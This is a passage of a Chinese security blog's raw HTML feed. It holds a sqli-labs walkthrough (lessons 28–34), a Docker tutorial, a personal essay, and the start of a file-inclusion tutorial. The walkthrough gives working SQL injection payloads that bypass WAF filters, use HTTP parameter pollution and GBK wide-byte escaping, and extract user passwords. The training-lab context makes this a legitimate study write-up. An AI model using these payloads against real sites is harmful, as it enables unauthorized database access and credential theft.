class="string">'data'</span>]:</span><br><span class="line">print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="less-28-union-空字符-select绕过-字符型"><a href="#less-28-union-空字符-select绕过-字符型" class="headerlink" title="less-28(union+空字符+select绕过,字符型)"></a>less-28(union+空字符+select绕过,字符型)</h2><p>waf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out UNION &amp; SELECT.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是过滤了<code>/* -- # 空格 union select</code>，这里的正则表达式<code>\s</code>匹配任意空字符，<code>/i</code>表示不区分大小写，但是需要注意的是这里过滤的是<code>union+空白字符+select同时匹配大小写</code>的这一个整体，所以直接使用%a0绕过空格即可，这个整体就不会被识别</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure><h2 id="less28-a"><a href="#less28-a" class="headerlink" title="less28-a"></a>less28-a</h2><p>waf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">//$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);//strip out /*</span><br><span class="line">//$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);//Strip out --.</span><br><span class="line">//$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);//Strip out #.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还注释掉这么多…更简单…<del>不知道在搞什么飞机…</del></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure><h2 id="less-29-HTTP参数污染"><a href="#less-29-HTTP参数污染" class="headerlink" title="less-29(HTTP参数污染)"></a>less-29(HTTP参数污染)</h2><p>只是过来学习一下waf，懒得装tomcat…但还是了解一下原理：</p><p><a href="https://whoimg.com/s/iu8sz" target="_blank" rel="noopener"><img src="https://i.whoimg.com/2019/07/01/iu8sz.png" alt="iu8sz.png"></a></p><p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 waf，由于解析参数机制的不同，我们此处可以利用该原理绕过 WAF 的检测；</p><p>数据解析顺序：tomcat从前往后，apache从后往前</p><p><img src="https://i.whoimg.com/2019/07/01/iuqWR.png" alt="iuqWR.png"></p><p>在login.php中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//echo $id1;</span><br><span class="line">whitelist($id1);</span><br></pre></td></tr></table></figure><p>经过白名单过滤的就只是tomcat解析到的第一个id参数，但是如果传入两个id参数，tomcat的过滤效果自然就灰飞烟灭……apache直接解析最后一个id，没有任何waf，轻松注入，该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击。HPP 可对服务器和客户端都能够造成一定的威胁。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>同29，只是改变为双引号</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>同29，只是改变为括号加双引号</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h2 id="less-32-宽字节注入"><a href="#less-32-宽字节注入" class="headerlink" title="less-32(宽字节注入)"></a>less-32(宽字节注入)</h2><p>转义函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()，mysql_real_escape_string()，mysql_escape_string()</span><br></pre></td></tr></table></figure><p>特殊字符前面被加上了<code>\</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hint: The Query String you input is escaped as : 1\&apos;--</span><br><span class="line">The Query String you input in Hex becomes : 315c272d2d20</span><br></pre></td></tr></table></figure><h3 id="how-to-solve"><a href="#how-to-solve" class="headerlink" title="how to solve \"></a>how to solve \</h3><p>而网站在过滤<code>&#39;</code>的时候，通常的思路就是将<code>&#39;</code>转换为<code>\&#39;</code>,因此我们在此想办法将<code>&#39;</code>前面添加的<code>\</code>去掉，一般有两种思路：</p><ol><li><p>第一种方法：程序的默认字符集是<code>GBK</code>等宽字节字符集，则可以发生GBK宽字节注入，url编码<code>\&#39;</code>为<code>%5c%27</code>，mysql使用GBK编码时，会默认两个字符为一个汉字，<code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），所以<code>%bb%5c%27</code>转化过来就是<code>汉字&#39;</code>，此时便可以直接闭合引号；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure></li><li><p>第二种方法：构造<code>id=%bb\\&#39;</code>，转义后为<code>%bb%5c\\\\&#39;</code>，其中<code>%bb%5c</code>为汉字，其余的四个<code>\</code>转义为两个<code>\</code>，那么单引号正好没有被转义</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb\\%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure></li></ol><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>这个只是调用了系统的转义函数<code>addslashes($string)</code>，注入方法和32一致</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;小刷一波，了解一下怎么bypass WAF
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Sql注入" scheme="https://gardenia30.top/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://gardenia30.top/2019/06/02/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/06/02/Docker学习笔记/</id>
    <published>2019-06-02T05:19:16.000Z</published>
    <updated>2019-06-02T05:38:15.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是在学习Docker路上的踩坑记录…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h2><p>Docker是基于Go语言实现的开源容器项目，诞生于2013年初，基于 Linux 内核的 cgroup，namespace，以及AUFS 类的 Union FS等技术，对进程进行封装隔离，属于 操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。</p><p>Docker 在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护。使得 Docker 技术比虚拟机技术更为轻便、快捷。</p><p>下面的图片比较了 Docker 和传统虚拟化方式的不同之处：</p><p><img src="https://s2.ax1x.com/2019/06/01/V3q0ns.png" alt="V3q0ns.png"></p><p><img src="https://s2.ax1x.com/2019/06/01/V3LFgg.png" alt="V3LFgg.png"></p><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便；</p><h3 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h3><p>在 Docker 的术语里，一个只读层被称为镜像，一个镜像是永久不会变的。由于 Docker 使用一个统一文件系统，Docker 进程认为整个文件系统是以读写方式挂载的。 但是所有的变更都发生在顶层的可写层，而下层的原始的只读镜像文件并未变化。由于镜像不 可写，所以镜像是无状态的。</p><h3 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h3><p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，按照我的理解，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样（类似沙盒）。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p><h3 id="Docker仓库"><a href="#Docker仓库" class="headerlink" title="Docker仓库"></a>Docker仓库</h3><p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。</p><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库</strong>（<code>Repository</code>）；每个仓库可以包含多个 <strong>标签</strong>（<code>Tag</code>）；每个标签对应一个镜像。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><h3 id="Docker-hub"><a href="#Docker-hub" class="headerlink" title="Docker hub"></a>Docker hub</h3><p>目前 Docker 官方维护了一个公共仓库 <a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a>，其中已经包括了数量超过 15,000 的镜像。大部分需求都可以通过在 Docker Hub 中直接下载镜像来实现。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>环境：CentOS7 Minimal</p><p>参考：<a href="https://www.widuu.com/docker/installation/centos.html" target="_blank" rel="noopener">官方手册</a></p><p>由于 Docker 的局限性，Docker 只能运行在64位的系统中，所以只能在CentOS6.5及以上的系统才可以安装，需要内核版本是 2.6.32-431 或者更高版本 ；</p><h3 id="本地安装Docker"><a href="#本地安装Docker" class="headerlink" title="本地安装Docker"></a>本地安装Docker</h3><p>1.Docker 软件包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum -y install docker</span><br></pre></td></tr></table></figure><p>2.安装完成以后可以查看下载的Docker版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker -v</span><br></pre></td></tr></table></figure><p>3.安装完成以后启动Docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service docker start</span><br></pre></td></tr></table></figure><p>4.如果希望 Docker 默认开机启动，如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chkconfig docker on</span><br></pre></td></tr></table></figure><h3 id="使用镜像加速器"><a href="#使用镜像加速器" class="headerlink" title="使用镜像加速器"></a>使用镜像加速器</h3><p>没有镜像和容器的Docker是没有灵魂的，所以我们要去拉取镜像来创建容器，但是经过之前的踩坑，发现拉取Docker的官方镜像实在是太慢了，所以在拉取镜像之前可以使用阿里云的镜像加速器来解决拉取镜像速度太慢的问题，每个人的阿里云账号的容器镜像服务里应该都有一个镜像加速器地址；</p><p><img src="https://s2.ax1x.com/2019/06/01/V3BPLn.png" alt="V3BPLn.png"></p><p>vim修改<code>/etc/docker/daemon.json</code>的地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxxxxxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使配置生效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>重启Docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service docker restart</span><br></pre></td></tr></table></figure><h3 id="使用docker用户组"><a href="#使用docker用户组" class="headerlink" title="使用docker用户组"></a>使用docker用户组</h3><p>一遍一遍地sudo都快烦死我了…为什么每次都需要sudo？？？</p><p>docker 进程通过监听一个 Unix Socket 来替代 TCP 端口。在默认情况下，docker 的 Unix Socket属于<code>root</code>用户，当然其他用户可以使用<code>sudo</code>方式来访问。因为这个原因， docker 进程就一直是<code>root</code>用户运行的。为了在使用 <code>docker</code> 命令的时候前边不再加<code>sudo</code>，我们需要创建一个叫 <code>docker</code> 的用户组，并且为用户组添加用户。然后在 <code>docker</code> 进程启动的时候，我们的 <code>docker</code> 群组有了 Unix Socket 的所有权，可以对 Socket 文件进行读写。</p><p>创建docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br></pre></td></tr></table></figure><p>将用户添加到docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gpasswd -a gard3nia docker</span><br></pre></td></tr></table></figure><p>重启系统登录即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><h4 id="1-搜索镜像"><a href="#1-搜索镜像" class="headerlink" title="1.搜索镜像"></a>1.搜索镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search imagename</span><br></pre></td></tr></table></figure><h4 id="2-拉取镜像"><a href="#2-拉取镜像" class="headerlink" title="2.拉取镜像"></a>2.拉取镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull imagename</span><br></pre></td></tr></table></figure><h4 id="3-列出本地镜像"><a href="#3-列出本地镜像" class="headerlink" title="3.列出本地镜像"></a>3.列出本地镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h4 id="4-删除镜像"><a href="#4-删除镜像" class="headerlink" title="4.删除镜像"></a>4.删除镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi imagename</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><h4 id="1-新建容器"><a href="#1-新建容器" class="headerlink" title="1.新建容器"></a>1.新建容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure><p>经常会用到的参数</p><ul><li><strong>-it:</strong> 其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开；</li><li><strong>–name:</strong> 为容器指定一个名称；</li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong>；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的高端口；</li><li><strong>-v:</strong>指定文件夹映射，格式为：<strong>主机(宿主)文件夹:容器文件夹</strong>；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li></ul><p>用拉取的centos镜像新建容器并进入bash终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name centos1 -it centos /bin/bash</span><br></pre></td></tr></table></figure><p>退出交互式终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ exit</span><br></pre></td></tr></table></figure><h4 id="2-查看容器"><a href="#2-查看容器" class="headerlink" title="2.查看容器"></a>2.查看容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps [-a] [-l]</span><br></pre></td></tr></table></figure><ul><li><strong>-a :</strong>显示所有的容器，包括未运行的。</li><li><strong>-l :</strong>显示最近创建的容器。</li><li>没有参数默认查看运行容器的进程</li></ul><h4 id="3-停止容器"><a href="#3-停止容器" class="headerlink" title="3.停止容器"></a>3.停止容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器name</span><br><span class="line">docker kill 容器name</span><br></pre></td></tr></table></figure><p>第一种是等待容器内进程结束再关闭，另外一种是直接强制结束容器</p><h4 id="4-开启容器"><a href="#4-开启容器" class="headerlink" title="4.开启容器"></a>4.开启容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器name</span><br></pre></td></tr></table></figure><h4 id="5-重启容器"><a href="#5-重启容器" class="headerlink" title="5.重启容器"></a>5.重启容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart 容器name</span><br></pre></td></tr></table></figure><h4 id="6-后台运行"><a href="#6-后台运行" class="headerlink" title="6.后台运行"></a>6.后台运行</h4><p>一般的话我们在运行一个交互式的bash的时候，用的是 <code>ctrl+P</code>和 <code>ctrl+Q</code>键去退出这样就会在后台一直运行</p><h4 id="7-重新进入后台运行的容器"><a href="#7-重新进入后台运行的容器" class="headerlink" title="7.重新进入后台运行的容器"></a>7.重新进入后台运行的容器</h4><p>1.docker attach</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><p>2.docker exec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec [-d] [-i] [-t] CONTAINER [command]</span><br></pre></td></tr></table></figure><h4 id="8-删除容器"><a href="#8-删除容器" class="headerlink" title="8.删除容器"></a>8.删除容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><ul><li><strong>-f :</strong>通过SIGKILL信号强制删除一个运行中的容器</li><li><strong>-l :</strong>移除容器间的网络连接，而非容器本身</li><li><strong>-v :</strong>-v 删除与容器关联的卷</li></ul><hr><p>Docker的强大还需更多学习，本文会做到动态更新！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是在学习Docker路上的踩坑记录…
    
    </summary>
    
      <category term="Docker" scheme="https://gardenia30.top/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://gardenia30.top/tags/Docker/"/>
    
      <category term="环境部署" scheme="https://gardenia30.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>May</title>
    <link href="https://gardenia30.top/2019/06/01/May/"/>
    <id>https://gardenia30.top/2019/06/01/May/</id>
    <published>2019-06-01T15:42:48.000Z</published>
    <updated>2019-06-07T14:01:29.245Z</updated>
    
    <content type="html"><![CDATA[<p>​    已是深夜，窗外却依旧灯火通明。<a id="more"></a></p><p>​    校庆的今天也是三点一线，只能说不愧是校庆，图书馆的空调也似乎突然感受到了我前几个星期的诉求，在校庆这一天似乎竭尽全力地想展现学校基础设施的完善，他在忘我地工作，似乎想把以前我诉求的冷气源源不断地还给我，谢谢，不过我知道空调是没有感情的，因为他不知道，要给在考研面前瑟瑟发抖的学子们一点温暖……</p><p>​    四月，樱花烂漫，却无时间去欣赏，只能在归宿路上匆匆一瞥；回忆里，上一次与你相见也是在四月，那时候的南方，樱花已谢，但与你相见，就像是个孩子得到了梦寐以求的七色糖果。</p><p>​    五月最浓墨重彩的一笔我的第一次北京之旅，应急响应杯，虽然最后和队友只拿了个第八，但真的感谢老张给的这次机会，北京之行着实意义重大，AWD初体验，让我了解到我究竟是个多菜的选手，我今后要在哪些方面需要继续提升；</p><p>​    六月，数学是主角，英语同样不可忽视，如果一天里考研复习进入学习效率很低的阶段可以拿出专业课再看看吧；</p><p>​    回首看看自己的博客，还是WP居多，整天写WP的人应该是没有什么未来的……所以还是把以前烂尾的东西收个尾，以后多写写技术总结性的文章（考完研），但是现在就可以暂时停止Web安全的学习了……</p><p>​    <strong>下面半年的任务：</strong> <strong>only考研</strong></p><p>​    <strong>不忘初心，砥砺前行！</strong></p><p>​    窗外已无灯火，我心却彻夜通明！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    已是深夜，窗外却依旧灯火通明。
    
    </summary>
    
      <category term="随笔" scheme="https://gardenia30.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://gardenia30.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-文件包含漏洞学习笔记</title>
    <link href="https://gardenia30.top/2019/05/23/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/05/23/Web安全-文件包含漏洞学习笔记/</id>
    <published>2019-05-23T06:48:33.000Z</published>
    <updated>2019-07-05T10:58:41.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初衷是灵活方便，殊不知方便永远是安全最大的敌人；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>开发人员通常会把可以重复使用的函数写到单个文件里，在使用某些函数时，直接调用此文件即可，无需再次编写，这种调用文件的过程一般被称为文件包含，但是正因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞；PHP的文件包含功能太强大，所以文件包含漏洞很多，但是其他语言也是有这种漏洞的；</p><h2 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h2><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><ul><li><code>include()</code>找不到被包含的文件时只会产生警告，脚本将继续执行；</li><li><code>include_once()</code>与<code>include()</code>类似，区别就是如果该文件中的代码已经被包含就不会再次包含；</li><li><code>require()</code>找不到被包含文件时会产生致命错误，脚本停止运行；</li><li><code>require_once()</code>与<code>require()</code>类似，区别就是如果该文件中的代码已经被包含就不会再次包含；</li></ul><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-包含有php标准语法的源文件"><a href="#1-包含有php标准语法的源文件" class="headerlink" title="1.包含有php标准语法的源文件"></a>1.包含有php标准语法的源文件</h4><p>文件include.php</p><p><img src="https://s2.ax1x.com/2019/05/04/EdyMuQ.png" alt="EdyMuQ.png"></p><p>文件hacker.txt</p><p><img src="https://s2.ax1x.com/2019/05/04/Edye9f.png" alt="Edye9f.png"></p><p>访问页面：</p><p><img src="https://s2.ax1x.com/2019/05/04/EdylHs.png" alt="EdylHs.png"></p><p>将包含的文件扩展名改为<code>rar,doc,jpg,xxx</code>都可以显示phpinfo的信息；由此看出如果包含的文件是php的语法规范时输出php代码运行结果；</p><h4 id="2-包含非php语法规范的源文件"><a href="#2-包含非php语法规范的源文件" class="headerlink" title="2.包含非php语法规范的源文件"></a>2.包含非php语法规范的源文件</h4><p>hacker.txt:</p><p><img src="https://s2.ax1x.com/2019/05/04/EdyH8f.png" alt="EdyH8f.png"></p><p>输出页面：</p><p><img src="https://s2.ax1x.com/2019/05/04/EdyXrQ.png" alt="EdyXrQ.png"></p><p>由此看出非php语法规范时，输出源码；</p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>php不仅可以包含本地文件，还可以直接对远程主机上的文件进行包含，远程文件包含与本地文件包含没有本质区别，无论是哪种扩展名，只要遵循php语法规范解析器就会对其进行解析，但是产生的条件比较苛刻，需要以下两个参数全部为on的情况下才可以包含成功</p><blockquote><p><code>allow_url_include = On</code></p><p><code>allow_url_fopen = On</code></p></blockquote><p><img src="https://s2.ax1x.com/2019/05/31/Vl5jwF.png" alt="Vl5jwF.png"></p><h4 